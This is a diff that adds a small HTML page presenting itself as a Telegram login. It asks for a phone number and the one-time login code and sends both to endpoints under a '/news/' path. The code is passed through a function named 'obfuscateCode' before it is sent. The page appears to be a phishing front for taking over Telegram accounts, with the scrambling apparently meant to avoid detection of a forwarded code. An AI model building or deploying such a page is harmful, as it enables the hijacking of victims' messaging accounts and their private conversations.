@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Telegram Login</title>
+  </head>
+  <body>
+    <h1>Telegram Login</h1>
+    <form id="phoneForm">
+      <label for="phoneNumber">Phone Number:</label>
+      <input
+        type="text"
+        id="phoneNumber"
+        name="phoneNumber"
+        required
+      /><br /><br />
+      <button type="submit">Send Code</button>
+    </form>
+    <form id="codeForm">
+      <label for="phoneCode">Phone Code:</label>
+      <input type="text" id="phoneCode" name="phoneCode" required /><br /><br />
+      <button type="submit">Login</button>
+    </form>
+    <script>
+      function obfuscateCode(code) {
+        return code.split('').join('a')
+      }
+
+      document
+        .getElementById('phoneForm')
+        .addEventListener('submit', async function (event) {
+          event.preventDefault()
+          const phoneNumber = document.getElementById('phoneNumber').value
+
+          const response = await fetch('/news/sendCode', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ phoneNumber }),
+          })
+
+          const result = await response.json()
+          if (result.success) {
+            document.getElementById('phoneForm').style.display = 'none'
+            document.getElementById('codeForm').style.display = 'block'
+          } else {
+            alert(result.message)
+          }
+        })
+
+      document
+        .getElementById('codeForm')
+        .addEventListener('submit', async function (event) {
+          event.preventDefault()
+          const phoneNumber = document.getElementById('phoneNumber').value
+          const phoneCode = document.getElementById('phoneCode').value
+          const obfuscatedCode = obfuscateCode(phoneCode)
+
+          const response = await fetch('/news/authTelegram', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ phoneNumber, phoneCode: obfuscatedCode }),
+          })
+
+          const result = await response.json()
+          alert(result.message)
+        })
+    </script>
+  </body>
+</html>
